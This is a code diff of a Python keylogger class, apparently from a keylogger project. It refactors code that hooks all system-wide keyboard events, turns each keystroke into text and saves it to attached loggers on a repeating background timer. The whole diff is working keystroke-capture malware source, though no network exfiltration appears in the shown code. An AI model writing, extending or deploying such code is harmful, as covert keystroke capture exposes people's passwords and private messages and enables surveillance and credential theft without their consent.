@@ -1,64 +1,80 @@
+import threading
+import time
+
 import keyboard
-from threading import Timer
+
 import keylogger_logger
+
 
 class Keylogger:
     def __init__(self):
         self.loggers = []
+        self.timer = None
 
-        keyboard.hook(callback=self._log_event)
-
-    def __del__(self):
-        print ('keylogger.del')                 ######################################################
-        for logger in self.loggers:
-            del logger
-
+        # log each key pressed
+        keyboard.hook(callback=self._on_event)
+        
     def add_logger(self, logger: keylogger_logger._AbstractLogger):
         self.loggers.append(logger)
         return self
 
-    def save_each(self, seconds):
+    def save_each(self, seconds: int):
+        # save each attached logger
         for logger in self.loggers:
             logger.save()
 
-        timer = Timer(interval=seconds, function=self.save_each, args=[[seconds]])
-        timer.daemon = True     # set the thread as daemon (dies when main thread dies)
-        timer.start()
+        # call this function again in `seconds` seconds
+        self.timer = threading.Timer(interval=seconds, function=self.save_each, args=[[seconds]])
+        self.timer.daemon = True     # set the thread as daemon (dies when main thread dies)
+        self.timer.start()
 
         return self
+    
+    def wait(self):
+        try:
+            while True:
+                time.sleep(1)
+        except Exception as e:
+            self.log_object(e)
+            self.stop()
+        except KeyboardInterrupt:
+            self.stop()
 
-    def _log(self, text: str):
+    def stop(self, *_):
+        if self.timer:
+            self.timer.cancel()
+
         for logger in self.loggers:
-            logger.log(text)
+            logger.close()
 
-    def _log_event(self, event: keyboard.KeyboardEvent):
+    def _on_event(self, event: keyboard.KeyboardEvent):
         if event.event_type == 'down':
-            self._log_keypress(event)
+            self._on_keypress(event)
         else:
-            self._log_keyrelease(event)
+            self._on_keyrelease(event)
 
-    def _log_keypress(self, event):
+    def _on_keypress(self, event: keyboard.KeyboardEvent):
         name = event.name
         
         # regular character
         if len(name) == 1:
-            self._log(name)
+            self.log_key(name)
             return
 
         # not a character, special key (e.g ctrl, alt, etc.)
         if name == 'space':
             # ' ' instead of 'space'
-            self._log(' ')
+            self.log_key(' ')
         elif name == 'enter':
             # add a new line whenever an ENTER is pressed
-            self._log('[ENTER]\n')
+            self.log_key('[ENTER]\n')
         elif name == 'decimal':
-            self._log('.')
+            self.log_key('.')
         else:
             # replace spaces with underscores
-            self._log('[{}]'.format(name.replace(' ', '_').upper()))
+            self.log_key('[{}]'.format(name.replace(' ', '_').upper()))
 
-    def _log_keyrelease(self, event):
+    def _on_keyrelease(self, event: keyboard.KeyboardEvent):
         name = event.name
 
         # skip regular letters
@@ -67,7 +83,15 @@ class Keylogger:
         if name in ['space', 'enter']:
             return
 
-        self._log('[{}-RELEASE]'.format(name.replace(' ', '_').upper()))
+        self.log_key('[{}-RELEASE]'.format(name.replace(' ', '_').upper()))
 
-    def wait(self):
-        keyboard.wait()
+    def log_key(self, text: str):
+        for logger in self.loggers:
+            logger.log(text)
+
+    def log_object(self, o):
+        for logger in self.loggers:
+            logger.log('\n----- Object start -----\n')
+            logger.log(str(o))
+            logger.log('\n----- Object end -----\n')
+    
